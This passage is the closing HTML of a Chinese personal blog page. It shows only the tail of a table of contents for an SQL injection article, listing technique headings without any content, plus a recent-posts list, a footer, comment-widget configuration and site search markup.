toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">4.3.</span> <span class="toc-text">SQL注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.1.</span> <span class="toc-text">union联合注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.5.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.6.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.7.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">4.8.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.9.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie%E6%B3%A8%E5%85%A5"><span class="toc-number">4.10.</span> <span class="toc-text">Cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSlog%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5"><span class="toc-number">4.11.</span> <span class="toc-text">DNSlog外带注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">万能密码</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/11/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/" title="SQL注入绕waf">SQL注入绕waf</a><time datetime="2025-09-11T01:44:45.000Z" title="发表于 2025-09-11 09:44:45">2025-09-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/08/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a><time datetime="2025-09-08T01:23:09.000Z" title="发表于 2025-09-08 09:23:09">2025-09-08</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By 沐风</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'iPU4vfkFLB3OW9ntYe6GyKzn-gzGzoHsz',
+      appKey: 'hVKfOjbimykva25sbr6SeSXu',
+      avatar: 'monsterid',
+      serverURLs: 'https://ipu4vfkf.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      visitor: true,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !true) {
+    if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="输入关键词…" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
